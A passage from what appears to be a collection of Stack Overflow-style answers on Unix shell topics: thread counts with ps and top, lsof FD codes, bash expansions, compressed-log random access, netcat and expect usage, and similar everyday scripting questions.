2160  2876  2161 99    4 15:22 pts/39   Rl+    0:14 ./puma\nkvantour  2160  2876  2162 99    4 15:22 pts/39   Rl+    0:14 ./puma\nkvantour  2160  2876  2163 99    4 15:22 pts/39   Rl+    0:14 ./puma\nhowever, adding the -m option clearly gives a nicer overview. This is especially handy when multiple processes are running with the same name.\n% ps -fmL $(pgrep puma)\nUID        PID  PPID   LWP  C NLWP STIME TTY      STAT   TIME CMD\nkvantour  2160  2876     -  0    4 15:22 pts/39   -      0:44 ./puma\nkvantour     -     -  2160  0    - 15:22 -        Sl+    0:00 -     \nkvantour     -     -  2161 99    - 15:22 -        Rl+    0:14 -     \nkvantour     -     -  2162 99    - 15:22 -        Rl+    0:14 -     \nkvantour     -     -  2163 99    - 15:22 -        Rl+    0:14 -     \nIn this example, you see that process puma with PID 2160 runs with 4 threads (NLWP) having the ID's 2160--2163. Under STAT you see two different values Sl+ and 'Rl+'. Here the l is an indicator for multi-threaded. S and R stand for interruptible sleep (waiting for an event to complete) and respectively running. So we see that 3 of the 4 threads are running at 99% CPU and one thread is sleeping. You also see the total accumulated CPU time (44s) while a single thread only runs for 14s.\nAnother way to obtain information is by directly using the format specifiers with -o or -O.\nman ps :: STANDARD FORMAT SPECIFIERS\n   lwp    lightweight process (thread) ID of the dispatchable\n          entity (alias spid, tid).  See tid for additional\n          information.  Show threads as if they were processes.\n   nlwp   number of lwps (threads) in the process.  (alias thcount).\nSo you can use any of lwp,spid or tid and nlwp or thcount.\nIf you only want to get the number of threads of a process called puma, you can use :\n% ps -o nlwp $(pgrep puma)\nNLWP\n   4\nor if you don't like the header\n% ps -h -o nlwp $(pgrep puma)\n   4\nYou can get a bit more information with :\n% ps -O nlwp $(pgrep puma)\nPID   NLWP S TTY          TIME COMMAND\n19304    4 T pts/39   00:00:00 ./puma\nFinally, you can combine the flags with ps aux to list the threads.\n % ps aux -L\nUSER       PID   LWP %CPU NLWP %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n...\nkvantour  1618  1618  0.0    4  0.0  33260  1436 pts/39   Sl+  15:17   0:00 ./puma\nkvantour  1618  1619 99.8    4  0.0  33260  1436 pts/39   Rl+  15:17   0:14 ./puma\nkvantour  1618  1620 99.8    4  0.0  33260  1436 pts/39   Rl+  15:17   0:14 ./puma\nkvantour  1618  1621 99.8    4  0.0  33260  1436 pts/39   Rl+  15:17   0:14 ./puma\n...\nCan top show information about threads or LWP's?\ntop has the option to show threads by hitting H in the interactive mode or by launching top with top -H. The problem is that it lists the threads as processes (similar to ps -fH).\n% top\ntop - 09:42:10 up 17 days, 3 min,  1 user,  load average: 3.35, 3.33, 2.75\nTasks: 353 total,   3 running, 347 sleeping,   3 stopped,   0 zombie\n%Cpu(s): 75.5 us,  0.6 sy,  0.5 ni, 22.6 id,  0.0 wa,  0.0 hi,  0.8 si,  0.0 st\nKiB Mem : 16310772 total,  8082152 free,  3662436 used,  4566184 buff/cache\nKiB Swap:  4194300 total,  4194300 free,        0 used. 11363832 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND\n  868 kvantour  20   0   33268   1436   1308 S 299.7  0.0  46:16.22 puma\n 1163 root      20   0  920488 282524 258436 S   2.0  1.7 124:48.32 Xorg\n ...\nHere you see that puma runs at about 300% CPU for an accumulated time of 46:16.22. There is, however, no indicator that this is a threaded process. The only indicator is the CPU usage, however, this could be below 100% if 3 threads are \"sleeping\"? Furthermore, the status flag states S which indicates that the first thread is asleep. Hitting H give you then\n% top -H\ntop - 09:48:30 up 17 days, 10 min,  1 user,  load average: 3.18, 3.44, 3.02\nThreads: 918 total,   5 running, 910 sleeping,   3 stopped,   0 zombie\n%Cpu(s): 75.6 us,  0.2 sy,  0.1 ni, 23.9 id,  0.0 wa,  0.0 hi,  0.2 si,  0.0 st\nKiB Mem : 16310772 total,  8062296 free,  3696164 used,  4552312 buff/cache\nKiB Swap:  4194300 total,  4194300 free,        0 used. 11345440 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND\n  870 kvantour  20   0   33268   1436   1308 R 99.9  0.0  21:45.35 puma\n  869 kvantour  20   0   33268   1436   1308 R 99.7  0.0  21:45.43 puma\n  872 kvantour  20   0   33268   1436   1308 R 99.7  0.0  21:45.31 puma\n 1163 root      20   0  920552 282288 258200 R  2.0  1.7 124:52.05 Xorg \n  ...\nNow we see only 3 threads. As one of the Threads is \"sleeping\", it is way down the bottom as top sorts by CPU usage.\nIn order to see all threads, it is best to ask top to display a specific pid (for a single process):\n% top -H -p $(pgrep puma)\ntop - 09:52:48 up 17 days, 14 min,  1 user,  load average: 3.31, 3.38, 3.10\nThreads:   4 total,   3 running,   1 sleeping,   0 stopped,   0 zombie\n%Cpu(s): 75.5 us,  0.1 sy,  0.2 ni, 23.6 id,  0.0 wa,  0.0 hi,  0.7 si,  0.0 st\nKiB Mem : 16310772 total,  8041048 free,  3706460 used,  4563264 buff/cache\nKiB Swap:  4194300 total,  4194300 free,        0 used. 11325008 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND\n  869 kvantour  20   0   33268   1436   1308 R 99.9  0.0  26:03.37 puma\n  870 kvantour  20   0   33268   1436   1308 R 99.9  0.0  26:03.30 puma\n  872 kvantour  20   0   33268   1436   1308 R 99.9  0.0  26:03.22 puma\n  868 kvantour  20   0   33268   1436   1308 S  0.0  0.0   0:00.00 puma\nWhen you have multiple processes running, you might be interested in hitting f and toggle PGRP on. This shows the Group PID of the process. (PID in ps where PID in top is LWP in ps).\nHow do I get the thread count without using ps or top?\nThe file /proc/$PID/status contains a line stating how many threads the process with PID $PID is using.\n% grep Threads /proc/19304/status\nThreads:        4\nGeneral comments\nIt is possible that you do not find the process of another user and therefore cannot get the number of threads that process is using. This could be due to the mount options of /proc/ (hidepid=2).\nUsed example program:\n#include <omp.h>\n#include <stdio.h>\n#include <stdlib.h>\n\nint main (int argc, char *argv[]) {\nchar c = 0;\n#pragma omp parallel shared(c)   {\n    int i = 0;\n    if (omp_get_thread_num() == 0) {\n      printf(\"Read character from input : \");\n      c = getchar();\n    } else {\n      while (c == 0) i++;\n      printf(\"Total sum is on thread %d : %d\\n\", omp_get_thread_num(), i);\n    }\n  }\n}\ncompiled with gcc -o puma --openmp",
    "What does the FD column of pipes listed by lsof mean?": "Files are not only opened as streams. Some of those are listed in lsof's manual:\nFD    is the File Descriptor number of the file or:\n\n           cwd  current working directory;\n           Lnn  library references (AIX);\n           err  FD information error (see NAME column);\n           jld  jail directory (FreeBSD);\n           ltx  shared library text (code and data);\n           Mxx  hex memory-mapped type number xx.\n           m86  DOS Merge mapped file;\n           mem  memory-mapped file;\n           mmap memory-mapped device;\n           pd   parent directory;\n           rtd  root directory;\n           tr   kernel trace file (OpenBSD);\n           txt  program text (code and data);\n           v86  VP/ix mapped file;\n\n      FD  is  followed  by one of these characters, describing the\n      mode under which the file is open:\n\n           r for read access;\n           w for write access;\n           u for read and write access;\n           space if mode unknown and no lock\n            character follows;\n           '-' if mode unknown and lock\n            character follows.\n\n      The mode character is followed by one of these lock  charac-\n      ters, describing the type of lock applied to the file:\n\n           N for a Solaris NFS lock of unknown type;\n           r for read lock on part of the file;\n           R for a read lock on the entire file;\n           w for a write lock on part of the file;\n           W for a write lock on the entire file;\n           u for a read and write lock of any length;\n           U for a lock of unknown type;\n           x  for an SCO OpenServer Xenix lock on part  of the\n      file;\n           X for an SCO OpenServer Xenix lock on  the   entire\n      file;\n           space if there is no lock.\n\n      See  the  LOCKS  section  for  more  information on the lock\n      information character.\n\n      The FD column contents constitutes a single field for  pars-\n      ing in post-processing scripts.",
    "Run shell command in gradle but NOT inside a task": "You can do something like the following:\ndef doMyThing(String target) {\n    exec {\n        executable \"something.sh\"\n        args \"-t\", target\n    }\n}\n\ntask doIt {\n    doLast {\n        doMyThing(\"/tmp/foo\")\n        doMyThing(\"/tmp/gee\")\n    }\n}\nThe exec here is not a task, it's the Project.exec() method.",
    "shell script to create a static HTML directory listing": "#!/bin/bash\n\nROOT=/tmp/test\nHTTP=\"/\"\nOUTPUT=\"_includes/site-index.html\" \n\ni=0\necho \"<UL>\" > $OUTPUT\nfor filepath in `find \"$ROOT\" -maxdepth 1 -mindepth 1 -type d| sort`; do\n  path=`basename \"$filepath\"`\n  echo \"  <LI>$path</LI>\" >> $OUTPUT\n  echo \"  <UL>\" >> $OUTPUT\n  for i in `find \"$filepath\" -maxdepth 1 -mindepth 1 -type f| sort`; do\n    file=`basename \"$i\"`\n    echo \"    <LI><a href=\\\"/$path/$file\\\">$file</a></LI>\" >> $OUTPUT\n  done\n  echo \"  </UL>\" >> $OUTPUT\ndone\necho \"</UL>\" >> $OUTPUT\nMy /tmp/test\n/tmp/test\n\u251c\u2500\u2500 accidents\n\u2502   \u251c\u2500\u2500 accident2.gif\n\u2502   \u251c\u2500\u2500 accident3.gif\n\u2502   \u2514\u2500\u2500 accident4.gif\n\u251c\u2500\u2500 bears\n\u2502   \u251c\u2500\u2500 bears1.gif\n\u2502   \u251c\u2500\u2500 bears2.gif\n\u2502   \u251c\u2500\u2500 bears3.gif\n\u2502   \u2514\u2500\u2500 bears4.gif\n\u2514\u2500\u2500 cats\n    \u251c\u2500\u2500 cats1.gif\n    \u2514\u2500\u2500 cats2.gif\nThe resulting output\n<UL>\n  <LI>accidents</LI>\n  <UL>\n    <LI><a href=\"/accidents/accident2.gif\">accident2.gif</a></LI>\n    <LI><a href=\"/accidents/accident3.gif\">accident3.gif</a></LI>\n    <LI><a href=\"/accidents/accident4.gif\">accident4.gif</a></LI>\n  </UL>\n  <LI>bears</LI>\n  <UL>\n    <LI><a href=\"/bears/bears1.gif\">bears1.gif</a></LI>\n    <LI><a href=\"/bears/bears2.gif\">bears2.gif</a></LI>\n    <LI><a href=\"/bears/bears3.gif\">bears3.gif</a></LI>\n    <LI><a href=\"/bears/bears4.gif\">bears4.gif</a></LI>\n  </UL>\n  <LI>cats</LI>\n  <UL>\n    <LI><a href=\"/cats/cats1.gif\">cats1.gif</a></LI>\n    <LI><a href=\"/cats/cats2.gif\">cats2.gif</a></LI>\n  </UL>\n</UL>\nYou could expand the UL with href too, but I wasn't sure if that's what you wanted.\necho \"  <UL><a href=\\\"/$path\\\">$path</a>\" >> $OUTPUT\nYou would have to run this in the parent folder of _includes",
    "osx change file encoding (iconv) recursive": "Adam' comment showed me the way how to resolve it, but this was the only syntax I made it work:\nfind /mydisk/myfolder -name \\*.xxx -type f | \\\n    (while read file; do\n        iconv -f ISO-8859-1 -t UTF-8 \"$file\" > \"${file%.xxx}-utf8.xxx\";\n    done);\n-i ... -o ... doesnt work, but >\nthx again\nekke",
    "How to zgrep the last line of a gz file without tail": "The easiest solution would be to alter your log rotation to create smaller files.\nThe second easiest solution would be to use a compression tool that supports random access.\nProjects like dictzip, BGZF, and csio each add sync flush points at various intervals within gzip-compressed data that allow you to seek to in a program aware of that extra information. While it exists in the standard, the vanilla gzip does not add such markers either by default or by option.\nFiles compressed by these random-access-friendly utilities are slightly larger (by perhaps 2-20%) due to the markers themselves, but fully support decompression with gzip or another utility that is unaware of these markers.\nYou can learn more at this question about random access in various compression formats.\nThere's also a \"Blasted Bioinformatics\" blog by Peter Cock with several posts on this topic, including:\nBGZF - Blocked, Bigger & Better GZIP! \u2013 gzip with random access (like dictzip)\nRandom access to BZIP2? \u2013 An investigation (result: can't be done, though I do it below)\nRandom access to blocked XZ format (BXZF) \u2013 xz with improved random access support\nExperiments with xz\nxz (an LZMA compression format) actually has random access support on a per-block level, but you will only get a single block with the defaults.\nFile creation\nxz can concatenate multiple archives together, in which case each archive would have its own block. The GNU split can do this easily:\nsplit -b 50M --filter 'xz -c' big.log > big.log.sp.xz\nThis tells split to break big.log into 50MB chunks (before compression) and run each one through xz -c, which outputs the compressed chunk to standard output. We then collect that standard output into a single file named big.log.sp.xz.\nTo do this without GNU, you'd need a loop:\nsplit -b 50M big.log big.log-part\nfor p in big.log-part*; do xz -c $p; done > big.log.sp.xz\nrm big.log-part*\nParsing\nYou can get the list of block offsets with xz --verbose --list FILE.xz. If you want the last block, you need its compressed size (column 5) plus 36 bytes for overhead (found by comparing the size to hd big.log.sp0.xz |grep 7zXZ). Fetch that block using tail -c and pipe that through xz. Since the above question wants the last line of the file, I then pipe that through tail -n1:\nSIZE=$(xz --verbose --list big.log.sp.xz |awk 'END { print $5 + 36 }')\ntail -c $SIZE big.log.sp.xz |unxz -c |tail -n1\nSide note\nVersion 5.1.1 introduced support for the --block-size flag:\nxz --block-size=50M big.log\nHowever, I have not been able to extract a specific block since it doesn't include full headers between blocks. I suspect this is nontrivial to do from the command line.\nExperiments with gzip\ngzip also supports concatenation. I (briefly) tried mimicking this process for gzip without any luck. gzip --verbose --list doesn't give enough information and it appears the headers are too variable to find.\nThis would require adding sync flush points, and since their size varies on the size of the last buffer in the previous compression, that's too hard to do on the command line (use dictzip or another of the previously discussed tools).\nI did apt-get install dictzip and played with dictzip, but just a little. It doesn't work without arguments, creating a (massive!) .dz archive that neither dictunzip nor gunzip could understand.\nExperiments with bzip2\nbzip2 has headers we can find. This is still a bit messy, but it works.\nCreation\nThis is just like the xz procedure above:\nsplit -b 50M --filter 'bzip2 -c' big.log > big.log.sp.bz2\nI should note that this is considerably slower than xz (48 min for bzip2 vs 17 min for xz vs 1 min for xz -0) as well as considerably larger (97M for bzip2 vs 25M for xz -0 vs 15M for xz), at least for my test log file.\nParsing\nThis is a little harder because we don't have the nice index. We have to guess at where to go, and we have to err on the side of scanning too much, but with a massive file, we'd still save I/O.\nMy guess for this test was 50000000 (out of the original 52428800, a pessimistic guess that isn't pessimistic enough for e.g. an H.264 movie.)\nGUESS=50000000\nLAST=$(tail -c$GUESS big.log.sp.bz2 \\\n         |grep -abo 'BZh91AY&SY' |awk -F: 'END { print '$GUESS'-$1 }')\ntail -c $LAST big.log.sp.bz2 |bunzip2 -c |tail -n1\nThis takes just the last 50 million bytes, finds the binary offset of the last BZIP2 header, subtracts that from the guess size, and pulls that many bytes off of the end of the file. Just that part is decompressed and thrown into tail.\nBecause this has to query the compressed file twice and has an extra scan (the grep call seeking the header, which examines the whole guessed space), this is a suboptimal solution. See also the below section on how slow bzip2 really is.\n  Perspective\nGiven how fast xz is, it's easily the best bet; using its fastest option (xz -0) is quite fast to compress or decompress and creates a smaller file than gzip or bzip2 on the log file I was testing with. Other tests (as well as various sources online) suggest that xz -0 is preferable to bzip2 in all scenarios.\n            \u2014\u2014\u2014\u2014\u2014 No Random Access \u2014\u2014\u2014\u2014\u2014\u2014     \u2014\u2014\u2014\u2014\u2014\u2014\u2014 Random Access \u2014\u2014\u2014\u2014\u2014\u2014\u2014\nFORMAT       SIZE    RATIO   WRITE   READ      SIZE    RATIO   WRITE   SEEK\n\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014   \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014     \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\n(original)  7211M   1.0000       -   0:06     7211M   1.0000       -   0:00\nbzip2         96M   0.0133   48:31   3:15       97M   0.0134   47:39   0:00\ngzip          79M   0.0109    0:59   0:22                                  \ndictzip                                        605M   0.0839    1:36  (fail)\nxz -0         25M   0.0034    1:14   0:12       25M   0.0035    1:08   0:00\nxz            14M   0.0019   16:32   0:11       14M   0.0020   16:44   0:00\nTiming tests were not comprehensive, I did not average anything and disk caching was in use. Still, they look correct; there is a very small amount of overhead from split plus launching 145 compression instances rather than just one (this may even be a net gain if it allows an otherwise non-multithreaded utility to consume multiple threads).",
    "Rename file by removing last n characters": "You can remove a fixed number of characters using\nmv \"$file\" \"${file%???????}\"  # 7 question marks to match 7 characters\nThis will work in any POSIX-compliant shell.\nTo remove the last extension (which may be more or less than 7 characters), use\nmv \"$file\" \"${file%.*}\"\nTo trim everything after a given extension, you can try\nEXT=csv\nmv \"$file\" \"${file%.$EXT.*}\".$EXT\nwhich actually removes .$EXT and everything after, but then reattaches .$EXT.",
    "What does the ${-#*i} mean in shell script?": "$- means shell flags.\n${-#*i} means shell flags minus first match of *i.\nIf these two are not equal, then the shell is considered interactive (flag i is present).",
    "In a bash function, how do I get stdin into a variable": "input=$(cat) is a perfectly fine way to capture standard input if you really need to. One caveat is that command substitutions strip all trailing newlines, so if you want to make sure to capture those as well, you need to ensure that something aside from the newline(s) is read last.\ninput=$(cat; echo x)\ninput=${input%x}   # Strip the trailing x\nAnother option in bash 4 or later is to use the readarray command, which will populate an array with each line of standard input, one line per element, which you can then join back into a single variable if desired.\nreadarray foo\nprintf -v foo \"%s\" \"${foo[@]}\"",
    "When do you use (( )) or /usr/bin/test": "To answer your question:\nyou want to use /usr/bin/test when you want to test something but not in a shell (for example find ... -exec test ...)\nyou want to use (( )) when you have an arithmetic expression to solve, AND you are using bash, because (( )) is bash specific.\nNow for some background:\nThe command /usr/bin/test is required by the POSIX standard. POSIX also requires that [ is defined as an alias for test. The only difference between test and [ is that [ requires the final parameter to be a ].\nSince test is used so frequently in shell scripts, most shells have a builtin version of test (and [). The advantage of a builtin is that it avoids context switches. Which, depending how you use test in your script, can be a measurable performance advantage.\nI think it is safe to assume that under most circumstances it doesn't matter whether you use the system test or the shell's builtin test. But if you want to use test in a find -exec situation then of course you have to use the system test because find cannot use the shell test.\n(( )) and [[ ]] were introduced by bash (and perhaps some other shells) as syntactic sugar. (( )) evaluates arithmetic expressions, while [[ ]] evaluates logical expressions. Both allow you to write the expressions in a \"more natural syntax\".\nThe decision to use [[ or [ depends on whether you want to use the \"more natural syntax\", and, since sh does not support [[, whether you want to depend on bash.\nThe decision to use (( )) depends on whether you need arithmetic expressions, and again, since sh does not support (( )), whether you want to depend on bash. The POSIX alternative to (( )) is $(( )). Note that there are some subtle differences in the behaviour.\nThe following links explain these topics in great detail:\nhttp://mywiki.wooledge.org/BashFAQ/031 (difference between test, [ and [[)\nhttp://mywiki.wooledge.org/ArithmeticExpression (let, (( )) and $(( )))\nhttp://www.ibm.com/developerworks/library/l-bash-test/index.html (all of the above)\nSee also:\nPOSIX definition of test\nPOSIX definition of $(( ))\nBonus: Some debian developers once argued whether they should use the system test or the shell builtin test, because of some differences in the implementation of the builtin test. If you are interested in details of the differences of the system test and the shell builtin test then you can read the debian developer discussion here: http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=267142.",
    "How to remove permanently a path from the fish $PATH?": "There's two ways to do this, and which one is valid depends on how the path got into $PATH.\nIt is possible to add directories to $PATH via e.g. set PATH $PATH /some/dir. At least by default, PATH is a global variable, which means it is per-session. That means to change something from $PATH, either remove it from where it is added (which is likely outside of fish since it inherits it), or put the set -e call in your ~/.config/fish/config.fish so it will be executed on every start.\nThere is also $fish_user_paths, which is a universal variable (meaning it carries the same value across fish sessions and is synchronized across them). On startup and whenever fish_user_paths is modified, fish adds it to $PATH. If the offending directory is added here, execute set -e fish_user_paths[index] once (e.g. in an interactive session).\nset -e fish_user_paths would remove the entire variable (while set -U fish_user_paths would clear it) which would also work but would also remove all other paths",
    "how to make subprocess called with call/Popen inherit environment variables": "If you look at the docs for Popen, it takes an env parameter:\nIf env is not None, it must be a mapping that defines the environment variables for the new process; these are used instead of inheriting the current process\u2019 environment, which is the default behavior.\nYou've written a function that extracts the environment you want from your sourced scripts and puts it into a dict. Just pass the result as the env to the scripts you want to use it. For example:\nenv = {}\nenv.update(os.environ)\nenv.update(source('~/scripts/mySetUpFreeSurfer.sh'))\nenv.update(source('/usr/local/freesurfer/FreeSurferEnv.sh'))\n\n# \u2026\n\ncheck_output(cmd, shell=True, env=env)",
    "ZSH history completion menu": "there is something in zsh called history-beginning-search-menu. if you put:\nautoload -Uz history-beginning-search-menu\nzle -N history-beginning-search-menu\nbindkey '^X^X' history-beginning-search-menu\nin your .zshrc file. then for example:\nkent$  sudo systemctl[here I type C-X twice]\nEnter digits:\n01 sudo systemctl acpid.service                      11 sudo systemctl enable netfs\n02 sudo systemctl enable acpid                       12 sudo systemctl enable networkmanager\n03 sudo systemctl enable alsa                        13 sudo systemctl enable NetworkManager\n04 sudo systemctl enable alsa-restore                14 sudo systemctl enable NetworkManager-wait-online\n05 sudo systemctl enable alsa-store                  15 sudo systemctl enable ntpd\n06 sudo systemctl enable cronie                      16 sudo systemctl enable sshd\n07 sudo systemctl enable cups                        17 sudo systemctl enable syslog-ng\n08 sudo systemctl enable dbus                        18 sudo systemctl enable tpfand\n09 sudo systemctl enable gdm                         19 sudo systemctl reload gdm.service\n10 sudo systemctl enable hal                         20 sudo systemctl restart gdm.service\nthen you need to give the index number to fire the command in history.\nof course there could be some optimization for that. but I think this gets you start.\nhope it helps.",
    "How do I convert a bash shell script to a .bat file? [closed]": "Actually, the things you mention are trivial to port to a Windows batch file. While you certainly can use Windows ports of all Unix tools (or even use an emulation layer for even more fun) this is not hard to do:\n~ for the user's home folder\nThe user's profile resides in the environment variable %USERPROFILE%, so the following should do it:\ncd %USERPROFILE%\\Documents\\DropFolder\nIterating over a set of files\nThe for command is helpful here:\nfor %%i in (*.xml) do -Xss650K -Xms128m -Xmx2048m -jar ... %%i\nObviously you need to adapt the path to the JAR file, though.\nAnd for has many more uses beyond this one, so take a look at help for as well.\nbasename\nYou need to do this either in a subroutine or a for loop, as the following syntax is specific to loop variables or parameters. It won't work with environment variables as is. You can get what basename is giving you by using %%~ni where %%i if the loop variable or %~n1 if %1 is the argument to a subroutine or batch file you have. So the following would probably do the same:\ncopy \"%%~ni.xml\" \"%USERPROFILE%\\Documents\\ReadyForServer\\%%~ni\\\"\nThe help on for has more information over those things near the end.",
    "Whats the difference between running a shell script as ./script.sh and sh script.sh": "Running it as ./script.sh will make the kernel read the first line (the shebang), and then invoke bash to interpret the script. Running it as sh script.sh uses whatever shell your system defaults sh to (on Ubuntu this is Dash, which is sh-compatible, but doesn't support some of the extra features of Bash).\nYou can fix it by invoking it as bash script.sh, or if it's your machine you can change /bin/sh to be bash and not whatever it is currently (usually just by symlinking it - rm /bin/sh && ln -s /bin/bash /bin/sh). Or you can just use ./script.sh instead if that's already working ;)\nIf your shell is indeed dash and you want to modify the script to be compatible, https://wiki.ubuntu.com/DashAsBinSh has a helpful guide to the differences. In your sample it looks like you'd just have to remove the function keyword.",
    "How do I kill all active tasks/apps using ADB?": "",
    "From node.js, which is faster, shell grep or fs.readFile?": "Here's my nodejs implementation, results are pretty much as expected: small files run faster than a forked grep (files up to 2-3k short lines), large files run slower. The larger the file, the bigger the difference. (And perhaps the more complex the regex, the smaller the difference -- see below.)\nI used my own qfgets package for fast line-at-a-time file i/o; there may be better ones out there, I don't know.\nI saw an unexpected anomaly that I did not investigate: the below timings are for the constant string regexp /foobar/. When I changed it to /[f][o][o][b][a][r]/ to actually exercise the regex engine, grep slowed down 3x, while node sped up! The 3x slowdown of grep is reproducible on the command line.\nfilename = \"/var/log/apache2/access.log\";     // 2,540,034 lines, 187MB\n//filename = \"/var/log/messages\";             // 25,703 lines, 2.5MB\n//filename = \"out\";                           // 2000 lines, 188K (head -2000 access.log)\n//filename = \"/etc/motd\";                     // 7 lines, 286B\nregexp = /foobar/;\n\nchild_process = require('child_process');\nqfgets = require('qfgets');\n\nfunction grepWithFs( filename, regexp, done ) {\n    fp = new qfgets(filename, \"r\");\n    function loop() {\n        for (i=0; i<40; i++) {\n            line = fp.fgets();\n            if (line && line.match(regexp)) process.stdout.write(line);\n        }\n        if (!fp.feof()) setImmediate(loop);\n        else done();\n    }\n    loop();\n}\n\nfunction grepWithFork( filename, regexp, done ) {\n    cmd = \"egrep '\" + regexp.toString().slice(1, -1) + \"' \" + filename;\n    child_process.exec(cmd, {maxBuffer: 200000000}, function(err, stdout, stderr) {\n        process.stdout.write(stdout);\n        done(err);\n    });\n}\nThe test:\nfunction fptime() { t = process.hrtime(); return t[0] + t[1]*1e-9 }\n\nt1 = fptime();\nif (0) {\n    grepWithFs(filename, regexp, function(){\n        console.log(\"fs done\", fptime() - t1);\n    });\n}\nelse {\n    grepWithFork(filename, regexp, function(err){\n        console.log(\"fork done\", fptime() - t1);\n    });\n}\nResults:\n/**\nresults (all file contents memory resident, no disk i/o):\ntimes in seconds, best run out of 5\n\n/foobar/\n             fork   fs\nmotd        .00876  .00358  0.41 x  7 lines\nout         .00922  .00772  0.84 x  2000 lines\nmessages    .0101   .0335   3.32 x  25.7 k lines\naccess.log  .1367   1.032   7.55 x  2.54 m lines\n\n/[f][o][o][b][a][r]/\naccess.log  .4244   .8348   1.97 x  2.54 m lines\n\n**/\n(The above code was all one file, I split it up to avoid the scrollbar)\nEdit: to highlight the key results:\n185MB, 2.54 million lines, search RegExp /[f][o][o][b][a][r]/:\ngrepWithFs\nelapsed: .83 sec\ngrepWithFork\nelapsed: .42 sec",
    "Is there anything like IPython / IRB for Perl?": "I usually just use perl -de0, but I've heard of:\nDevel::REPL\nperlconsole",
    "Ripgrep to only exclude a file in the root of the folder": "ripgrep has support for this, regardless of the globbing syntax that is support by your shell because its support is independent of the shell.\nripgrep's -g/--glob flag allows you to include or exclude files. And in particular, it follows the same semantics that gitignore uses (see man gitignore). This means that if you start a glob pattern with a /, then it will only match that specific path relative to where ripgrep is running. For example:\n$ tree\n.\n\u251c\u2500\u2500 a\n\u2502   \u2514\u2500\u2500 index1.html\n\u251c\u2500\u2500 index1.html\n\u251c\u2500\u2500 index2.html\n\u2514\u2500\u2500 index3.html\n\n1 directory, 4 files\n\n$ rg --files\nindex1.html\na/index1.html\nindex2.html\nindex3.html\n\n$ rg --files -g '!index1.html'\nindex2.html\nindex3.html\n\n$ rg --files -g '!/index1.html'\nindex2.html\nindex3.html\na/index1.html\nWhen using the -g flag, the ! means to ignore files matching that pattern. When we run rg --files -g '!index1.html', it will result in ignoring all files named index1.html. But if we use !/index1.html, then it will only ignore the top-level index1.html. Similarly, if we use !/a/index1.html, then it would only ignore that file:\n$ rg --files -g '!/a/index1.html'\nindex1.html\nindex2.html\nindex3.html\nripgrep has more details about the -g/--glob flag in its guide.",
    "zsh error: export:54: not valid in this context:": "When defining or exporting a variable, you should not use $:\nexport PATH=/Users...\nOtherwise, the current value of PATH will be substituted into the export statement.",
    "Send Commands to socket using netcat": "When you run nc interactively, it takes input from standard input (your terminal), so you can interact with it and send your commands.\nWhen you run it in your batch script, you need to feed the commands into the standard input stream of nc - just putting the commands on the following lines won't do that; it will try to run those as entirely separate batch commands.\nYou need to put your commands into a file, then redirect the file into nc:\nnc 192.168.1.186 9760 < commands.txt\nOn Linux, you can use a \"here document\" to embed the commands in the script.\nnc 192.168.1.186 9760 <<END\ncommand1\ncommand2\nEND\nbut I haven't found an equivalent for windows batch scripts. It's a bit ugly, but you could echo the commands to a temp file, then redirect that to nc:\necho command1^\n\ncommand2 > commands.txt\n\nnc 192.168.1.186 9760 < commands.txt\nThe ^ escape character enables you to put a literal newline into the script. Another way to get newlines into an echo command (from this question):\necho command1 & echo.command2 > commands.txt\nIdeally we'd just pipe straight to nc (this isn't quite working for me, but I can't actually try it with nc at the moment):\necho command1 & echo.command2 | nc 192.168.1.186 9760",
    "Starting a new bash shell from a bash shell": "Try:\nbash -c 'gnome-terminal -x cd /absolute-path && program_name'",
    "Can't Connect to MongoDB Atlas Cluster Using Mongo Shell": "I had to create a new user with a different username and password, and when I ran the command with these new credentials I could connect.",
    "let telnet execute single command in one line": "I found expect to do exactly what i want, wait for a certain output and then act upon it:\nexpect << EOF\nspawn telnet localhost 4242\nexpect -re \".*>\"\nsend \"show network\\r\"\nexpect -re \".*>\"\nsend \"exit\\r\"\nEOF",
    "tail -f into grep into cut not working properly": "the problem is almost certainly related to how grep and cut buffer their output. here's a hack that should get you around the problem, though i'm sure there are prettier ways to do it:\ntail -f /var/somelog | while read line; do echo \"$line\" | grep \"some test and p l a c e h o l d e r\" | cut -f 3,4,14 -d \" \"; done\n(don't forget the ; done at the end of the command)\nalternatively, because gawk doesn't buffer it's output, you could use it in place of cut to avoid the cumbersome while loop:\ntail -f log | grep --line-buffered \"some test and p l a c e h o l d e r\" | gawk '{print $3,$4,$14}'\ncheck out http://www.pixelbeat.org/programming/stdio_buffering/ for more info on buffering problems.",
    "Perl's file test operator -f returns true for symbolic links": "When you test a symlink, the test is carried out on the thing that the symlink points to unless you use the -l symlink test.\nThis parallels the stat and lstat Linux system-calls which behave similarly. That is, if you stat a symlink, you'll get the result for the target of the symlink, whereas if you lstat the symlink, you'll get the result for the symlink itself. This behaviour is intentional so that na\u00efve programs don't have to care about symlinks, and symlinks will just work as intended.\nYou should find that if your symlink refers to a directory, the -f test is false and the -d test is true.",
